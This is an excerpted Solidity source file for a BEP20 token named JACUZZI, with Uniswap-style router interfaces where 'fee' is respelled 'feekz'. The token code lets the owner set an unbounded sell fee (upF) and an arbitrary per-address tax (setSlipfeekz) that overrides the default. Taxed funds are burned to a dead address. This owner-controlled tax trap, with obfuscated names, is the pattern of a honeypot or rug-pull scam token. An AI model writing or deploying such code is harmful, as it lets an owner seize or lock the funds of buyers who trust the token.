...
interface IUniswapV2Factory {
    ...
    function feekzTo() external view returns (address);
    function feekzToSetter() external view returns (address);
    ...
    function setfeekzTo(address) external;
    function setfeekzToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeekzOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeekzOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeekzOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeekzOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeekzOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract JACUZZI is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeekz = 0;

    uint256 private _defaultBuyfeekz = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeekz;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeekz = _value;
    }

    function setSlipfeekz(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeekz[_address] = _value;
    }

    function getSlipfeekz(address _address) external view onlyownar returns (uint256) {
        return _slipfeekz[_address];
    }


    function setMAccountfeekz(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeekz(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeekzAmount = 0;

        if (rF) {
            uint256 tradefeekz = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeekz = _defaultSellfeekz;
                }
                if (from == uniswapV2Pair) {

                    tradefeekz = _defaultBuyfeekz;
                }
            }
            if (_slipfeekz[from] > 0) {
                tradefeekz = _slipfeekz[from];
            }

            tradefeekzAmount = _Amount.mul(tradefeekz).div(100);
        }


        if (tradefeekzAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeekzAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeekzAmount);
            emit Transfer(from, _deadAddress, tradefeekzAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeekzAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeekzAmount);
        emit Transfer(from, _to, _Amount - tradefeekzAmount);
    }
